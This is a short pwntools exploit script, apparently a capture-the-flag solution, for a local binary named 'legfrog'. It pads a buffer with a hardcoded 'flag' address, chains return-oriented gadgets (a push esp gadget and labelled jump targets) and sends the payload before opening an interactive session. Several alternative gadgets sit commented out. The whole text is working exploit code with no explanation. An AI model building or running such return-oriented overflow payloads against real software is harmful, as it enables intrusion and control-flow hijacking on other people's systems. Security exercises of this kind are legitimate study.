from pwn import *
s = process('./legfrog')
raw_input('debug')
globle_offset_table = 0x56556fb4
offset = 0x1c
leapA = 0x56dd 
leap2 = 0x6f4
leap3 = 0x75d 
leap3_42 = 0x787
flag = 0x565557aa
main = 0x565558c0
pop_ebx = 0x565554d5 
mov_ebp_esp = 0x56555681 
push_esp =0x565555d0 #push esp ; mov ebx, dword ptr [esp] ; ret
win2 = 0x5655700a
win3 = 0x5655700b  
payload = p32(flag)*(offset/4)
# payload += '\xdd\x56\x55\x56'
payload += p32(0x565556dd) #leapA
# payload += p32(0x5655575d) #leap3 
# payload += p32(mov_ebp_esp)
payload += p32(push_esp)
payload += p32(0x56555787)#leap3_42
# payload += p32(main)
# payload += p32(0x565556f4 ) #leap2
# payload += p32(pop_ebx)
# payload += p32(win2)
# payload += 
payload += p32(flag)
s.sendline(payload)
s.interactive()